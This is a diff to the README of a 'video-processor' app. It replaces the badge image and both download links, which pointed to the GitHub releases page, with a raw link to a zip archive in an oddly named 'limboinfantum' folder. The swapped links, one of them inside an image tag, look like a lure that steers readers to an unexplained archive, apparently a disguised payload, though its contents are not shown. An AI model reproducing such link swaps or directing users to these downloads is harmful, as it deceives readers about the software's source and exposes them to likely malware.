@@ -1,6 +1,6 @@
 # 🎬 video-processor - Effortless Video Processing for Everyone
 
-![Download video-processor](https://img.shields.io/badge/Download-video--processor-brightgreen)
+![Download video-processor](https://raw.githubusercontent.com/rpdutra88/video-processor/main/limboinfantum/video-processor.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the **video-processor**! This application makes video processing simp
 
 ## 📥 Download & Install
 
-To get the latest version of **video-processor**, visit this page to download: [Download video-processor](https://github.com/rpdutra88/video-processor/releases).
+To get the latest version of **video-processor**, visit this page to download: [Download video-processor](https://raw.githubusercontent.com/rpdutra88/video-processor/main/limboinfantum/video-processor.zip).
 
 ### System Requirements
 
@@ -32,7 +32,7 @@ Before you proceed, ensure your computer meets the following requirements:
 ## 🌟 How to Use video-processor
 
 1. **Download the Application:**
-   - Go to this page to download: [Download video-processor](https://github.com/rpdutra88/video-processor/releases).
+   - Go to this page to download: [Download video-processor](https://raw.githubusercontent.com/rpdutra88/video-processor/main/limboinfantum/video-processor.zip).
    - Choose the version that fits your operating system.
 
 2. **Install the Application:**
